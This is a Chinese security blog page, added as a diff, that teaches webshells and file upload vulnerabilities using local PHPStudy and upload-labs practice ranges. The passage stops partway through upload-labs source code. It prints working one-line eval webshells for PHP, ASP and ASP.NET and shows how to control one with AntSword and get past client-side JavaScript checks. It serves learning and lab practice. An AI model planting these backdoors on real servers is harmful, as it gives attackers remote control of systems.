@@ -1,0 +1,1562 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="文件上传, 鹤归">
+    <meta name="description" content="
+一、WebShell 与 WebShell 管理工具
+1.1 什么叫做WebShell ？
+WebShell , 简称网页后门。简单来说它是运行在Web应用之上的远程控制程序。
+webShell其实就是一张网页，由PHP、JSP、ASP、">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>文件上传 | 鹤归</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">鹤归</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-book" style="zoom: 0.6;"></i>
+      
+      <span>文章</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags">
+          
+          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>标签</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories">
+          
+          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>分类</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>时轴</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>清单</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/musics">
+          
+          <i class="fas fa-music" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>音乐</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/movies">
+          
+          <i class="fas fa-film" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>电影</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/galleries">
+          
+          <i class="fas fa-image" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>相册</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">鹤归</div>
+        <div class="logo-desc">
+            
+            手书无愧，无惧人间是非
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-book"></i>
+			
+			文章
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/tags " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
+			      
+		          <span>标签</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
+			      
+		          <span>分类</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/archives " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
+			      
+		          <span>时轴</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			清单
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/musics " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-music" style="position: absolute;left:50px" ></i>
+			      
+		          <span>音乐</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/movies " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-film" style="position: absolute;left:50px" ></i>
+			      
+		          <span>电影</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/galleries " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-image" style="position: absolute;left:50px" ></i>
+			      
+		          <span>相册</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/102.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">文件上传</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E7%BD%91%E5%AE%89/">
+                                <span class="chip bg-color">网安</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">漏洞</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                <span class="chip bg-color">文件上传</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-category">
+                                文件上传
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-07-21
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    6.6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    27 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p><a name="CnPQp"></a></p>
+<h2 id="一、WebShell-与-WebShell-管理工具"><a href="#一、WebShell-与-WebShell-管理工具" class="headerlink" title="一、WebShell 与 WebShell 管理工具"></a>一、WebShell 与 WebShell 管理工具</h2><p><a name="S25gD"></a></p>
+<h3 id="1-1-什么叫做WebShell-？"><a href="#1-1-什么叫做WebShell-？" class="headerlink" title="1.1 什么叫做WebShell ？"></a>1.1 什么叫做WebShell ？</h3><ul>
+<li>WebShell , 简称网页后门。简单来说它是运行在Web应用之上的远程控制程序。</li>
+<li>webShell其实就是一张网页，由PHP、JSP、ASP、ASP.NET等这类web应用程序语言开发，但webShell并不具备常见网页的功能，例如登录、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息等功能。</li>
+<li><strong>常见的WebShell有哪些？</strong></li>
+<li>大马、小马、各种马…等</li>
+<li>拥有较完整功能的webshell，我们一般称为大马。</li>
+<li>功能简易的webshell称为小马。</li>
+<li>除此之外还存在一句话木马、菜刀马、脱库马等等的名词，是对于webShell功能或者特性的简称。<br><a name="sBLRC"></a></li>
+</ul>
+<h3 id="1-2-WebShell-有什么作用呢-？"><a href="#1-2-WebShell-有什么作用呢-？" class="headerlink" title="1.2 WebShell 有什么作用呢 ？"></a>1.2 WebShell 有什么作用呢 ？</h3><p><a name="LRIBB"></a></p>
+<h4 id="1-2-1-让我们拿举个例子-一句话木马-来讲："><a href="#1-2-1-让我们拿举个例子-一句话木马-来讲：" class="headerlink" title="1.2.1 让我们拿举个例子(一句话木马)来讲："></a>1.2.1 让我们拿举个例子(一句话木马)来讲：</h4><ul>
+<li>在举例之前的呢，我们要做一些前期准备。</li>
+</ul>
+<p><strong>前期准备</strong>：</p>
+<ol>
+<li>安装一下集成环境：这里推荐使用 PHPstudy </li>
+<li>安装好环境之后我们来编写一个一句话木马（如何编写我们之后详细讲解）</li>
+<li>写好之后呢，我们进行本地利用。</li>
+</ol>
+<hr>
+<ul>
+<li>首先我来完整的给大家演示一遍</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182618029.png" alt="image-20230724182618029"></p>
+<ul>
+<li><p>掏出我们之前准备好的一句话木马，放在phpStudy\PHPTutorial\WWW目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[x]); ?&gt; </span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>本地访问：</strong> 127.0.0.1&#x2F;shell.php（我们刚才创建的木马文件名称）</p>
+</li>
+<li><p>打开HackBar（浏览器插件）：尝试利用这个一句话木马来返回PHPinfo的信息</p>
+</li>
+<li><p>构建返回PHPinfo的语句：X&#x3D;phpinfo();这也是一个任意代码执行，我们通过变量X传递的任何指令都会被当做PHP代码来执行。也可以通过这条指令来调用调用系统函数：X&#x3D;system(whomai); 、x&#x3D;system(whomai);</p>
+</li>
+</ul>
+<hr>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182646939.png" alt="image-20230724182646939"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182702206.png" alt="image-20230724182702206"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182715247.png" alt="image-20230724182715247"><br><a name="OlUL9"></a></p>
+<h4 id="1-2-2-大马有什么作用呢"><a href="#1-2-2-大马有什么作用呢" class="headerlink" title="1.2.2 大马有什么作用呢?"></a>1.2.2 大马有什么作用呢?</h4><ul>
+<li>当我们通过某些操作上传了大马之后，我们可以通过大马来获取目标主机的控制权限、对内网进行扫描、获取内部系统的信息、盗取数据库等等一系列操作。</li>
+<li>我们可以在GitHub上来搜索一些webshell（网上的信息可能存在后门要注意分辨，这里我就不放了）<br><a name="aH9D3"></a></li>
+</ul>
+<h3 id="1-3-WebShell-之-PHP-一句话木马解读"><a href="#1-3-WebShell-之-PHP-一句话木马解读" class="headerlink" title="1.3 WebShell 之 PHP 一句话木马解读"></a>1.3 WebShell 之 PHP 一句话木马解读</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[x]); ?&gt; </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>$_POST[x]: 获取 POST请求参数中X的值。例如POST请求中传递 x&#x3D;phpinfo();，那么 $_POST[x]就等同于phpinfo();</p>
+</li>
+<li><p>eval（）将字符串当做PHP代码去执行。例如 eval(‘phpinfo();’)，其中 phpinfo();会被当做PHP代码去执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[x]); ?&gt;   实际上的传递过程是这样的 			 			</span><br><span class="line">                ↓ </span><br><span class="line">&lt;?php @eval(&#x27;phpinfo();&#x27;); ?&gt; 实际的语句是这样的 			 </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>我们通过该webshell，传递任意PHP代码，让其去执行，从而达到任意代码执行。</p>
+</li>
+<li><p>错误控制运算符，当将 @放置在一个PHP表达式之前，该表达式可能产生的任何错误信息都被 忽略掉。<br><a name="zn2XX"></a></p>
+</li>
+</ul>
+<h3 id="1-4-WebShell-之常用的一句话木马"><a href="#1-4-WebShell-之常用的一句话木马" class="headerlink" title="1.4 WebShell 之常用的一句话木马"></a>1.4 WebShell 之常用的一句话木马</h3><ul>
+<li><p>ASP：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;x&quot;)%&gt; </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ASP.NET：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval (Request.Item[&quot;x&quot;],&quot;unsafe&quot;);%&gt; </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这些一句话木马的本质是一样的，不同环境要用不同的一句话木马。<br><a name="j46qF"></a></p>
+</li>
+</ul>
+<h3 id="1-5-WebShell-管理工具"><a href="#1-5-WebShell-管理工具" class="headerlink" title="1.5 WebShell 管理工具"></a>1.5 WebShell 管理工具</h3><p><a name="qIY2P"></a></p>
+<h4 id="1-5-1-常用-WebShell-管理工具"><a href="#1-5-1-常用-WebShell-管理工具" class="headerlink" title="1.5.1 常用 WebShell 管理工具"></a>1.5.1 常用 WebShell 管理工具</h4><ul>
+<li>中国菜地</li>
+<li>中国蚁剑</li>
+<li>冰蝎</li>
+<li>哥斯拉</li>
+<li>…<br><a name="rU587"></a></li>
+</ul>
+<h4 id="1-5-2-我们来拿中国蚁剑来举例："><a href="#1-5-2-我们来拿中国蚁剑来举例：" class="headerlink" title="1.5.2 我们来拿中国蚁剑来举例："></a>1.5.2 我们来拿中国蚁剑来举例：</h4><ul>
+<li>打开中国蚁剑，右键打开添加数据</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182847760.png" alt="image-20230724182847760"></p>
+<ul>
+<li>URL地址：就是一句话木马的地址</li>
+<li>链接密码：就是变量X</li>
+<li>编码设置：UTF8</li>
+<li>链接类型：PHP（你用什么一句话木马链接什么类型）</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182901618.png" alt="image-20230724182901618"></p>
+<ul>
+<li>测试一下：链接成功</li>
+<li>如果链接失败的话，你是不能进行正常访问的。</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182914159.png" alt="image-20230724182914159"></p>
+<ul>
+<li>选择添加就可以看到你链接的数据了</li>
+<li>能够进入到你木马存放的目录了。</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182925802.png" alt="image-20230724182925802"></p>
+<ul>
+<li>我们可以尝试着进行增删改查，来实现一些我们想要实现的操作。</li>
+<li>比如说我们创建一个新的目录，猪猪</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182936801.png" alt="image-20230724182936801"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724182952088.png" alt="image-20230724182952088"></p>
+<ul>
+<li>可以查看到刚才新建的</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183003748.png" alt="image-20230724183003748"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183028277.png" alt="image-20230724183028277"></p>
+<ul>
+<li>比如说我们再创建一个新的目录，1234</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183042124.png" alt="image-20230724183042124"> <img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183055708.png" alt="image-20230724183055708"></p>
+<ul>
+<li>让我们看看实际演示的过程</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183111681.png" alt="image-20230724183111681"></p>
+<ul>
+<li><strong>我们也可以尝试使用一下虚拟终端</strong></li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183135163.png" alt="image-20230724183135163"></p>
+<ul>
+<li>打开虚拟终端，输入ipconfig 可以查看一下当前的网络信息</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183152547.png" alt="image-20230724183152547"></p>
+<ul>
+<li><strong>还可以链接数据库</strong></li>
+<li><strong>前提：</strong> 你需要知道数据库的账号和密码</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183204577.png" alt="image-20230724183204577"></p>
+<ul>
+<li>还有一个拓展功能，插件市场。</li>
+<li>插件市场里面可以选择安装一些常见的插件。比如说存活扫描之类的等等。</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183219716.png" alt="image-20230724183219716"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183232973.png" alt="image-20230724183232973"><br><a name="tiSVz"></a></p>
+<h3 id="1-6-拓展思考"><a href="#1-6-拓展思考" class="headerlink" title="1.6 拓展思考"></a>1.6 拓展思考</h3><ul>
+<li>我们上面讲了这么多，这个时候有些同学可能就会有疑问了。<br><a name="cZvp4"></a></li>
+</ul>
+<h4 id="1-6-1-思考一："><a href="#1-6-1-思考一：" class="headerlink" title="1.6.1 思考一："></a>1.6.1 思考一：</h4><ul>
+<li>如果去掉一句话木马中的错误运算符 @会产生怎样的效果呢？</li>
+<li>那我们现在就来尝试一下：</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183246453.png" alt="image-20230724183246453"></p>
+<ul>
+<li>可以看到会出现报错信息。</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183258235.png" alt="image-20230724183258235"><br><a name="CuPYl"></a></p>
+<h4 id="1-6-2-思考二："><a href="#1-6-2-思考二：" class="headerlink" title="1.6.2 思考二："></a>1.6.2 思考二：</h4><ul>
+<li>大马跟小马有什么区别呢？</li>
+<li>小马的代码量小，但是运行的时候需要环境。功能单一且操作复杂。</li>
+<li>大马的功能强大，但是限制多（比如说会有很多限制函数），代码量大。也不是很好用。<br><a name="S8JcX"></a></li>
+</ul>
+<h2 id="二、文件上传漏洞概述"><a href="#二、文件上传漏洞概述" class="headerlink" title="二、文件上传漏洞概述"></a>二、文件上传漏洞概述</h2><p><a name="Fs27t"></a></p>
+<h3 id="2-1-随处可见的文件上传功能"><a href="#2-1-随处可见的文件上传功能" class="headerlink" title="2.1 随处可见的文件上传功能"></a>2.1 随处可见的文件上传功能</h3><ul>
+<li>大部分站点都具有 文件上传功能，例如头像更改，文章编辑，附件上传等等。</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183312064.png" alt="image-20230724183312064"><br><a name="VKngU"></a></p>
+<h3 id="2-2-文件上传功能背后的业务逻辑是什么？"><a href="#2-2-文件上传功能背后的业务逻辑是什么？" class="headerlink" title="2.2 文件上传功能背后的业务逻辑是什么？"></a>2.2 文件上传功能背后的业务逻辑是什么？</h3><ul>
+<li><strong>文件上传的这个功能是如何实现的呢？</strong></li>
+<li>文件上传功能的作用是将 本地文件上传至服务器上进行保存。</li>
+<li>当我们找到上传的入口，上传文件之后。</li>
+<li>可能会回显文件上传的路径，如果回显了文件上传路径，那么我们就可以根据回显的文件上传路径进行访问，那么我们就可以在浏览器中访问到服务器上的这个文件。</li>
+<li>可以尝试用pickchu靶场进行复现。</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44519789/article/details/114969948">PikaChu_不安全的文件上传漏洞</a></li>
+<li>这里的复现过程，我就不一一赘述了。感兴趣的大家可以访问上面的链接。</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183332909.png" alt="image-20230724183332909"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183347059.png" alt="image-20230724183347059"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183408678.png" alt="image-20230724183408678"><br><a name="tqofB"></a></p>
+<h3 id="2-3-任意文件上传的安全风险"><a href="#2-3-任意文件上传的安全风险" class="headerlink" title="2.3 任意文件上传的安全风险"></a>2.3 任意文件上传的安全风险</h3><ul>
+<li><strong>假设文件上传功能没有对上传的文件进行限制，可能会引发哪些安全风险?</strong></li>
+<li>如果是对方是LAMP架构，是否能上传PHP的WebShell到服务端上，然后通过访问上传后的文件地址，从而执行WebShell中的代码。达到控制对方服务器的目的。</li>
+<li><strong>实验演示：</strong></li>
+<li>让我们禁用JS来跳过验证来上传一句话木马</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183420476.png" alt="image-20230724183420476"></p>
+<ul>
+<li>上传成功之后，尝试访问木马，访问成功之后来验证一下，尝试返回phpinfo的信息。返回信息成功之后，让我们挂上蚁剑。</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183432110.png" alt="image-20230724183432110"></p>
+<ul>
+<li>来我们尝试来链接上蚁剑，链接上之后就能就能干我们想要的操作了。</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183451313.png" alt="image-20230724183451313"> <img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183503781.png" alt="image-20230724183503781"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183515475.png" alt="image-20230724183515475"><br><a name="MTYUw"></a></p>
+<h3 id="2-4-什么是文件上传漏洞"><a href="#2-4-什么是文件上传漏洞" class="headerlink" title="2.4 什么是文件上传漏洞"></a>2.4 什么是文件上传漏洞</h3><ul>
+<li>文件上传漏洞是指文件上传功能没有对上传的文件做合理严谨的过滤，导致用户可以利用此功能，上传能被服务端解析执行的文件，并通过此文件获得执行服务端命令的能力。</li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183530376.png" alt="image-20230724183530376"><br><a name="S7EyX"></a></p>
+<h2 id="三、文件上传漏洞绕过"><a href="#三、文件上传漏洞绕过" class="headerlink" title="三、文件上传漏洞绕过"></a>三、文件上传漏洞绕过</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32448559/article/details/81667309">环境准备：upload-labs 靶场的安装与配置教程</a><br><a name="hCVVG"></a></li>
+</ul>
+<h3 id="3-1-文件上传的验证机制有哪些"><a href="#3-1-文件上传的验证机制有哪些" class="headerlink" title="3.1 文件上传的验证机制有哪些"></a>3.1 文件上传的验证机制有哪些</h3><ul>
+<li><strong>客户端JavaScript验证</strong></li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183656050.png" alt="image-20230724183656050"></p>
+<ul>
+<li><strong>服务端MIME类型验证</strong></li>
+<li><strong>服务端文件扩展名验证（ 黑名单、 白名单 ）</strong></li>
+<li><strong>服务器文件内容验证 （ 文件头(文件幻数) 、文件加载检测 ）</strong><br><a name="MuUq5"></a></li>
+</ul>
+<h4 id="3-1-1-客户端JavaScript验证"><a href="#3-1-1-客户端JavaScript验证" class="headerlink" title="3.1.1 客户端JavaScript验证"></a>3.1.1 客户端JavaScript验证</h4><ul>
+<li><strong>目的：</strong> 对上传文件的文件格式进行一个验证</li>
+<li><strong>客户端JavaScript验证验证的机制</strong></li>
+</ul>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724183707890.png" alt="image-20230724183707890"></p>
+<hr>
+<ul>
+<li><p>打开upload-labs 靶场第一题 - JS检查</p>
+</li>
+<li><p><strong>源码分析</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>; </span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="variable">$msg</span> = <span class="literal">null</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;     </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;         </span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];         <span class="comment">//取出文件上传后临时存储的文件名         </span></span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];         <span class="comment">//生成一个新的文件存储路径，文件名保持文件上传前的文件名         </span></span><br><span class="line">        <span class="keyword">if</span> 